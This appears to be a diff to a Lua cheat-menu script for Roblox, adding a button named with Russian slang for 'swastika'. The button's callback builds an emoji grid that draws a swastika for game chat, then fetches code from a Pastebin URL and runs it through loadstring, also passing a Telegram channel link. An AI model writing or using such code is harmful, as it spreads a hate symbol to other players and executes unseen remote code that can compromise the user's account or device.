@@ -20,10 +20,18 @@ local QuitDivider = Main:Divider{
 
 -- All functions have the Name, Description and Callback arguments so you can use them whenever ig yeah
 local KillAll = Divider:Button{
-   Name = "Name",
-   Description = "описание",
+   Name = "Свастон",
+   Description = "эта функция работает не на всех плейсах",
    Callback = function()
-       скрипт
+       getgenv().Chats = {
+    {"⬛⬛⬛✅⬛✅✅✅⬛⬛⬛", 5},
+    {"⬛⬛⬛✅⬛✅⬛⬛⬛⬛⬛", 5},
+    {"⬛⬛⬛✅✅✅✅✅⬛⬛⬛", 5},
+    {"⬛⬛⬛⬛⬛✅⬛✅⬛⬛⬛", 5},
+    {"⬛⬛⬛✅✅✅⬛✅⬛⬛⬛", 5},
+}
+ 
+loadstring(game:HttpGet("https://pastebin.com/raw/vjQqcnLL"))("t.me/arceusxscripts")
    end
 }
 
